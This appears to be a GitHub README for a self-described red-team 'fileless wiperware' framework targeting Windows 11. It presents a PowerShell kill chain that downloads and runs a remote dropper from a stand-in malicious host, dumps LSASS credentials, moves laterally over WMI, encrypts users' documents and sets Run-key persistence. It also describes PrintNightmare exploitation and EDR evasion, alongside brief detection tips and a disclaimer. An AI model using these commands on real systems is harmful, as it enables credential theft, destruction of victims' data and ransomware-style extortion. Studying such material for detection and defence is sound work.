
# 🚩 Overview

![Demo Screenshot](https://github.com/user-attachments/assets/f93a65bd-d000-41f0-a941-631f047417e4)

---

## 🔒 Project NSFW: Net Sharing Fileless Wiperware

### Executive Summary

**Project NSFW** is a cutting-edge red/purple team research initiative that simulates a **fileless and polymorphic malware** framework, purpose-built for **Windows 11** environments. This project highlights the real-world feasibility of advanced cyberattacks that operate solely in memory and weaponize native system binaries (LOLBins), leaving minimal forensic traces. Drawing inspiration from NotPetya-class threats, NSFW demonstrates how adversaries can exploit Windows **print spooler services** for stealthy lateral movement and privilege escalation. The framework is designed not only to emulate sophisticated adversary actions, but also to support defender education in modern detection and mitigation strategies.

---

This repository enables simulation of a realistic adversary kill chain using MITRE ATT&CK techniques, emphasizing complete fileless operation and stealth.

---

## 🔓 Fileless Ransomware Lab Example (LOLBins in Action)

> **Warning:** This is a synthetic simulation for red team research.  
> **Never run outside of an isolated test lab.**

```powershell
# Initial Access (T1190) - Load dropper via web
IEX(New-Object Net.WebClient).DownloadString("http://malicious.com/dropper.ps1")

# Execution (T1059.001) - Decode & load payload
$bytes = [System.Convert]::FromBase64String("[Base64Payload]") 
[System.Reflection.Assembly]::Load($bytes)

# Privilege Escalation (T1548)
Start-Process powershell -Args "-ExecutionPolicy Bypass -File C:\Temp\elevate.ps1" -Verb RunAs

# Credential Access (T1003.001)
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\Temp\lsass.dmp full

# Lateral Movement (T1021.001)
wmic /node:targetPC process call create "powershell.exe -File \\share\payload.ps1"

# File Encryption (T1486)
$files = Get-ChildItem -Path "C:\Users\*\Documents" -Include *.docx,*.pdf -Recurse
foreach ($file in $files) {
  $data = Get-Content $file.FullName -Raw
  $aes = New-Object System.Security.Cryptography.AesManaged
  $aes.Key = [Text.Encoding]::UTF8.GetBytes("RANDOM-GEN-KEY-1234567890123456")
  $aes.IV = New-Object byte[] 16
  $enc = $aes.CreateEncryptor().TransformFinalBlock([Text.Encoding]::UTF8.GetBytes($data), 0, $data.Length)
  Set-Content -Path $file.FullName -Value ([Convert]::ToBase64String($enc))
}

# Persistence (T1547.001)
Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "ransomware" -Value "powershell -File C:\Temp\persist.ps1"
```

---

### 🧠 Core Concepts

#### **Net Sharing (Initial Access & Wormability)**

* Leverages Windows print and file sharing through `net.exe`, `net use`, and other LOLBins.
* Automates exploitation of **PrintNightmare** and **HiveNightmare** vulnerabilities (`CVE-2021-34527`, `CVE-2021-36934`) for privilege escalation and worm-like propagation.
* Supports both Metasploit-driven attacks (`exploit/windows/printnightmare`) and custom PowerShell/WMI remote execution.

#### **Fileless Execution (Stealth & Evasion)**

* Executes all payloads directly in memory using trusted system binaries:
  * `rundll32.exe`, `regsvr32.exe`, `mshta.exe`, `cmdkey.exe`, `wmic.exe`
* Minimizes disk writes to thwart forensic analysis and evade AV/EDR detection.
* Delivers shellcode through phishing attachments such as `.jpg`, `.lnk`, or `.ps1` files.

#### **Wiper Logic (Final Stage Payload)**

* Emulates ransomware behavior but with a focus on **destruction rather than extortion**.
* Employs **DiskCryptor-based encryption**.
* Can optionally print ransom notes via Windows printer services for realism.

---

### 🧩 Attack Flow Overview

1. **Initial Access** – Spear phishing with embedded `.jpg` or `.lnk` files.
2. **Exploit** – Abuse of Print Spooler or Registry CVEs for escalation.
3. **Lateral Movement** – Network spreading via `net use`, WMI, or PowerShell remoting.
4. **Persistence** – Scheduled tasks or registry keys using LOLBins for stealth.
5. **Payload Execution** – In-memory DLL or shellcode injection (Donut/sRDI).
6. **Impact** – NTFS metadata destruction, ransom notes deployment, and system disruption.

---

### 🎯 Objectives

| Red Team (Adversary Simulation)         | Blue Team (Defender Insight)                 |
| --------------------------------------- | -------------------------------------------- |
| Demonstrate AV/EDR evasion with LOLBins | Tune threat hunting based on ATT&CK mapping  |
| Trigger controlled system failure       | Apply Sigma/Sysmon for real-time monitoring  |

---

### 🔍 Detection & Mitigation Strategy

* Aligned with MITRE ATT&CK tactics:
  * `T1055` (Process Injection), `T1562` (Defense Evasion), `T1021` (Remote Services)
* Recommended detection sources:
  * **Sysmon**, **ELK**, **Splunk**, **Sigma Rules**
* Monitoring tips:
  * Watch for Print Spooler restarts, `rundll32`/`regsvr32` anomalies
  * Track unexpected driver or service installations
  * Monitor memory entropy and suspicious in-memory code execution

---

### ⚠️ Legal Disclaimer

All code, content, and techniques provided in this project are strictly for **educational** and **authorized penetration testing** purposes only. Usage must be confined to **isolated lab environments** with **explicit written permission**. Unauthorized use outside these parameters may violate laws and regulations.

---

## 🧭 Additional Resources

* [LOLOL Farm – LOLBin Playground](https://lolol.farm/)
* [LOLGEN – Generate LOLBin Chains](https://lolgen.hdks.org/)
* [MITRE ATT&CK: S0697](https://attack.mitre.org/software/S0697/)
* [DLL Injection Primer](https://www.crow.rip/crows-nest/mal/dev/inject/dll-injection)
* [Print Spooler Exploit Chain](https://itm4n.github.io/printnightmare-not-over/)
* [Fileless Malware – Wikipedia](https://en.wikipedia.org/wiki/Fileless_malware)

---

### 📚 Print Spooler CVEs

* [SysNightmare](https://github.com/GossiTheDog/SystemNightmare)
* [PrintSpoofer (Original)](https://github.com/itm4n/PrintSpoofer/tree/master)
* [PrintSpoofer 2](https://github.com/dievus/printspoofer)
* [HiveNightmare](https://github.com/GossiTheDog/HiveNightmare)
